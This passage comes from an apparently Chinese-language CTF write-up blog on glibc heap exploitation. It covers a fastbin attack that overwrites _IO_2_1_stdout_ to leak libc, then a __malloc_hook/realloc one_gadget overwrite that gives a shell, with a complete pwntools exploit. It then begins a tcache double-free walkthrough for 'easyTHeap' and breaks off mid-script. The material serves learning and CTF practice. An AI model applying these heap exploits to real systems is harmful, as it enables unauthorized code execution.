class="hljs-comment"># 修改chunk 2 的size和fd</span><br>p = p64(<span class="hljs-number">0</span>)<br>p += p64(<span class="hljs-number">0x71</span>)  <span class="hljs-comment"># 修改为fastbin, 绕过检查</span><br>p += <span class="hljs-string">&#x27;\xdd\x25&#x27;</span> <span class="hljs-comment"># partial write指向_IO_2_1_stderr + 157处</span><br>ad(<span class="hljs-number">0x20</span>, p) <span class="hljs-comment"># patial write to _IO_2_1_stderr_ + 157</span><br>   <br></code></pre></td></tr></table></figure>



<h3 id="打入-IO-2-1-stderr-157处"><a href="#打入-IO-2-1-stderr-157处" class="headerlink" title="打入_IO_2_1_stderr + 157处"></a>打入_IO_2_1_stderr + 157处</h3><p>满足size调试如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; x /40gx (long int)&amp;_IO_2_1_stdout_ - 0x43<br>0x7f007e1fe5dd &lt;_IO_2_1_stderr_+157&gt;:	0x007e1fd660000000	0x000000000000007f<br>0x7f007e1fe5ed &lt;_IO_2_1_stderr_+173&gt;:	0x0000000000000000	0x0000000000000000<br>0x7f007e1fe5fd &lt;_IO_2_1_stderr_+189&gt;:	0x0000000000000000	0x0000000000000000<br>0x7f007e1fe60d &lt;_IO_2_1_stderr_+205&gt;:	0x0000000000000000	0x007e1fc6e0000000<br>0x7f007e1fe61d &lt;_IO_2_1_stderr_+221&gt;:	0x00fbad288700007f	0x007e1fe6a3000000<br>0x7f007e1fe62d &lt;_IO_2_1_stdout_+13&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f<br>0x7f007e1fe63d &lt;_IO_2_1_stdout_+29&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f<br>0x7f007e1fe64d &lt;_IO_2_1_stdout_+45&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f<br>0x7f007e1fe65d &lt;_IO_2_1_stdout_+61&gt;:	0x007e1fe6a400007f	0x000000000000007f<br></code></pre></td></tr></table></figure>

<p>把刚才所构建的fastbin chunk 2放入fastbin 中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fastbin attack to _IO__2_1_stderr + 157</span><br>   <span class="hljs-comment"># 为了 构造fastbin attack</span><br>rm(<span class="hljs-number">4</span>)<br>rm(<span class="hljs-number">1</span>)<br>rm(<span class="hljs-number">4</span>)<br>ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\xa0&#x27;</span>) <span class="hljs-comment"># 将fastbin chunk 2放入fastbin 中</span><br><br><span class="hljs-comment"># for alignment</span><br>ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br></code></pre></td></tr></table></figure>



<h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>修改<code>_IO_2_1_stdout</code>结构体实现打印出libc中的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x33</span><br>   <span class="hljs-comment"># _IO_2_1_stdout_ struct</span><br>p += p64(<span class="hljs-number">0xfbad3c80</span>) <span class="hljs-comment"># _IO_2_1_stdout_ flag</span><br>p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>p += p8(<span class="hljs-number">8</span>)<br><br>ad(<span class="hljs-number">0x60</span>, p)<br>lib.address = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - (<span class="hljs-number">0x7ffff7dd2608</span> - <span class="hljs-number">0x7ffff7a0d000</span>)<br>li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(lib.address))<br></code></pre></td></tr></table></figure>



<h3 id="打入-malloc-hook-0x23处"><a href="#打入-malloc-hook-0x23处" class="headerlink" title="打入__malloc_hook - 0x23处"></a>打入__malloc_hook - 0x23处</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fast bin attack to malloc_hook - 0x23</span><br>   <span class="hljs-comment"># 为了 构造fastbin attack</span><br>rm(<span class="hljs-number">5</span>)	<br>rm(<span class="hljs-number">6</span>)	<br>rm(<span class="hljs-number">5</span>)	<br><br>p = p64(lib.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>)<br>ad(<span class="hljs-number">0x68</span>, p)<br>ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># for ajust</span><br>ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># for ajust</span><br><br><br><br></code></pre></td></tr></table></figure>



<h3 id="修改malloc-hook-和realloc-hook打one-gadget"><a href="#修改malloc-hook-和realloc-hook打one-gadget" class="headerlink" title="修改malloc_hook 和realloc_hook打one_gadget"></a>修改malloc_hook 和realloc_hook打one_gadget</h3><p>通过realloc的push次数来调整execve的第二个参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">gadget = [<span class="hljs-number">0x45216</span>, <span class="hljs-number">0x4526a</span>, <span class="hljs-number">0xf02a4</span>, <span class="hljs-number">0xf1147</span>]<br>one_gadget = lib.address + gadget[<span class="hljs-number">1</span>]<br><br>p = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x13</span> -<span class="hljs-number">8</span>)<br>p += p64(one_gadget)<br>p += p64(lib.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>] + <span class="hljs-number">12</span>)<br>ad(<span class="hljs-number">0x68</span>, p)<br></code></pre></td></tr></table></figure>



<h3 id="get-shell-1"><a href="#get-shell-1" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># get shell</span><br>ru(<span class="hljs-string">&#x27;del&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;pwn&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>remotePort = <span class="hljs-number">0</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;2.del&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;2.del&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))	<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 0</span><br><br>	p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x50</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x31</span>)<br><br>	ad(<span class="hljs-number">0x60</span>, p) <span class="hljs-comment"># idx 1</span><br>	ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;B&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>	ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 3</span><br>	ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 4</span><br><br>	<span class="hljs-comment"># for fastbin attack to _free_hook</span><br>	ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 5</span><br>	ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 6</span><br><br><br>	rm(<span class="hljs-number">3</span>)<br>	rm(<span class="hljs-number">0</span>)<br>	rm(<span class="hljs-number">3</span>)<br><br>	rm(<span class="hljs-number">2</span>) <span class="hljs-comment"># for patial write to </span><br><br>	ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\x90&#x27;</span>) <span class="hljs-comment"># attack to chunk 2 - 0x10</span><br><br>	ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br><br>	p = p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x71</span>)<br>	p += <span class="hljs-string">&#x27;\xdd\x25&#x27;</span><br>	ad(<span class="hljs-number">0x20</span>, p) <span class="hljs-comment"># patial write to _IO_2_1_stderr_ + 157</span><br><br><br>	<span class="hljs-comment"># fastbin attack to _IO__2_1_stderr + 157</span><br>	rm(<span class="hljs-number">4</span>)<br>	rm(<span class="hljs-number">1</span>)<br>	rm(<span class="hljs-number">4</span>)<br>	ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\xa0&#x27;</span>)<br><br>	<span class="hljs-comment"># for alignment</span><br>	ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	<br>	p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x33</span><br>	p += p64(<span class="hljs-number">0xfbad3c80</span>)<br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>	p += p8(<span class="hljs-number">8</span>)<br><br>	ad(<span class="hljs-number">0x60</span>, p)<br>	lib.address = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - (<span class="hljs-number">0x7ffff7dd2608</span> - <span class="hljs-number">0x7ffff7a0d000</span>)<br>	li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(lib.address))<br><br>	<span class="hljs-comment"># fast bin attack to malloc_hook - 0x23</span><br>	rm(<span class="hljs-number">5</span>)	<br>	rm(<span class="hljs-number">6</span>)	<br>	rm(<span class="hljs-number">5</span>)	<br><br>	p = p64(lib.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>)<br>	ad(<span class="hljs-number">0x68</span>, p)<br>	ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># for ajust</span><br>	ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># for ajust</span><br><br><br>	gadget = [<span class="hljs-number">0x45216</span>, <span class="hljs-number">0x4526a</span>, <span class="hljs-number">0xf02a4</span>, <span class="hljs-number">0xf1147</span>]<br>	one_gadget = lib.address + gadget[<span class="hljs-number">1</span>]<br><br>	p = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x13</span> -<span class="hljs-number">8</span>)<br>	p += p64(one_gadget)<br>	p += p64(lib.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>] + <span class="hljs-number">12</span>)<br>	ad(<span class="hljs-number">0x68</span>, p)<br><br>	<span class="hljs-comment"># get shell</span><br>	ru(<span class="hljs-string">&#x27;del&#x27;</span>)<br>	sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>	<span class="hljs-comment">#db()</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">[rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">[rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">[rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>



<h1 id="easyTHeap"><a href="#easyTHeap" class="headerlink" title="easyTHeap"></a>easyTHeap</h1><h2 id="来源-6"><a href="#来源-6" class="headerlink" title="来源"></a>来源</h2><p>v &amp; n</p>
<h2 id="难度-5"><a href="#难度-5" class="headerlink" title="难度"></a>难度</h2><p>4 &#x2F; 10</p>
<h2 id="保护-6"><a href="#保护-6" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<h2 id="简单描述-5"><a href="#简单描述-5" class="headerlink" title="简单描述"></a>简单描述</h2><p>该环境为glibc 2.27, 有teache机制.题中有五个功能,利用有限制,malloc只能7次以下, free 3次以下.</p>
<h2 id="vul-7"><a href="#vul-7" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  v1 = inputNum();<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">6</span> || !heap_array[v1] )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)heap_array[v1]);<br>  size_array[v1] = <span class="hljs-number">0</span>;                           <span class="hljs-comment">// not set ptr as null, can be double free</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>拥有uaf漏洞,可以使用teache机制double free任意地址分配.</p>
<h2 id="打法1"><a href="#打法1" class="headerlink" title="打法1"></a>打法1</h2><p>评估: </p>
<p>复杂度: 比较复杂  成功率: 低</p>
<h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><p>tcache, IO_FILE</p>
<h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了<code>malloc</code>和<code>free</code>的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,实现任意地址分配.修改IO_2_1_stdout结构, 实现IO流对vtable的调用来触发one_gadget.</p>
<h3 id="利用-7"><a href="#利用-7" class="headerlink" title="利用"></a>利用</h3><h4 id="准备-3"><a href="#准备-3" class="headerlink" title="准备"></a>准备</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;vn_pwn_easyTHeap&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">28200</span><br><br><br>LOCAL = <span class="hljs-number">0</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-comment"># 这里由于直接查找_IO_str_jumps找不到,可以采取这样的办法查找_IO_str_jumps,也可以通过调试直接找.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps_offset</span>(): <br>	IO_file_jumps_offset = lib.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>	IO_str_underflow_offset = lib.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>	<span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> lib.search(p64(IO_str_underflow_offset)):<br>		possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>		<span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>			<span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: 